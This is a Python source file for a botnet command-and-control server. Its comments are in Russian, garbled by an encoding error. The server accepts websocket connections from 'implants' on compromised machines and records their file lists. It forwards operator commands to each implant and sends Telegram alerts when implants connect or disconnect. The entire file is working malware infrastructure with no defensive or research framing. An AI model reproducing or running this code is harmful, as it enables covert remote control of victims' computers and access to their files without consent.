#
# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 2.3 - "–®—É–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ") ---
# –ò—Å–ø—Ä–∞–≤–ª—è–µ—Ç –ø–∞—Ä–∞–ª–∏—á —Å–µ—Ä–≤–µ—Ä–∞ –∏–∑-–∑–∞ –±–ª–æ–∫–∏—Ä—É—é—â–µ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ Telegram.
# –û—Ç—Å—Ç—É–ø—ã –≤—ã–≤–µ—Ä–µ–Ω—ã.
#
import asyncio
import json
import os
import urllib.parse
import urllib.request
from aiohttp import web
import settings

# ==============================================================================
# –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø –í TELEGRAM (–ë–ï–ó –ë–õ–û–ö–ò–†–û–í–ö–ò)
# ==============================================================================
def send_telegram_message(message, loop):
  """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram, –Ω–µ –±–ª–æ–∫–∏—Ä—É—è –æ—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫."""
  def send():
    # –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Å–æ–¥–µ—Ä–∂–∏—Ç –±–ª–æ–∫–∏—Ä—É—é—â–∏–π —Å–µ—Ç–µ–≤–æ–π –∫–æ–¥
    try:
      url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
      urllib.request.urlopen(url, timeout=10)
    except Exception as e:
      print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")

  # –ó–∞–ø—É—Å–∫–∞–µ–º –±–ª–æ–∫–∏—Ä—É—é—â–∏–π –∫–æ–¥ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—É–ª–µ –ø–æ—Ç–æ–∫–æ–≤
  loop.run_in_executor(None, send)

# ==============================================================================
# –ì–õ–û–ë–ê–õ–¨–ù–û–ï –°–û–°–¢–û–Ø–ù–ò–ï
# ==============================================================================
IMPLANTS, OPERATOR = {}, None

# ==============================================================================
# –û–°–ù–û–í–ù–û–ô –û–ë–†–ê–ë–û–¢–ß–ò–ö WEBSOCKET
# ==============================================================================
async def websocket_handler(request):
  global OPERATOR, IMPLANTS
  ws = web.WebSocketResponse()
  await ws.prepare(request)
  client_type, client_id = None, None

  loop = asyncio.get_running_loop()

  try:
    initial_msg = await ws.receive_json(timeout=15.0)
    client_type = initial_msg.get('type')

    if client_type == 'operator':
      OPERATOR = ws
      print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
      await broadcast_bot_list()
    elif client_type == 'implant':
      client_id = initial_msg.get('id')
      IMPLANTS[client_id] = {
        "ws": ws,
        "files": initial_msg.get('files', {}),
        "volume": initial_msg.get('current_volume', 50)
      }
      print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
      send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}", loop)
      await broadcast_bot_list()
    else:
      await ws.close()
      return ws

    async for msg in ws:
      if msg.type == web.WSMsgType.TEXT:
        if msg.data == 'ping':
          await ws.send_str('pong')
          continue

        data = json.loads(msg.data)

        if client_type == 'operator':
          target_id = data.get('target_id')
          if data['type'] == 'command' and target_id in IMPLANTS:
            await IMPLANTS[target_id]["ws"].send_json(data['payload'])
          elif data['type'] == 'get_details' and target_id in IMPLANTS:
            details = {
              "files": IMPLANTS[target_id].get("files"),
              "volume": IMPLANTS[target_id].get("volume")
            }
            await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

        elif client_type == 'implant':
          if data.get('type') == 'file_list_update':
            if client_id in IMPLANTS:
              IMPLANTS[client_id]["files"] = data.get('files', {})
              if OPERATOR:
                await broadcast_bot_list()
                await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

  except (asyncio.TimeoutError, json.JSONDecodeError):
    pass
  except Exception:
    pass
  finally:
    if client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
      send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}", loop)
      await broadcast_bot_list()
    elif client_type == 'operator':
      OPERATOR = None
      print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
  return ws

# ==============================================================================
# –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò –ò –ó–ê–ü–£–°–ö
# ==============================================================================
async def broadcast_bot_list():
  if OPERATOR and not OPERATOR.closed:
    try:
      await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})
    except (ConnectionResetError, asyncio.CancelledError):
      pass

async def http_handler(request):
  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
  app = web.Application()
  app.router.add_get('/', http_handler)
  app.router.add_get('/ws', websocket_handler)
  runner = web.AppRunner(app)
  await runner.setup()
  port = int(os.environ.get("PORT", 10000))
  site = web.TCPSite(runner, '0.0.0.0', port)
  await site.start()
  print(f"====== C2 SERVER (V2.3) ONLINE on port {port} ======")
  send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' V2.3 –∑–∞–ø—É—â–µ–Ω.", asyncio.get_running_loop())
  await asyncio.Event().wait()

if __name__ == "__main__":
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
  finally:
    print("–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
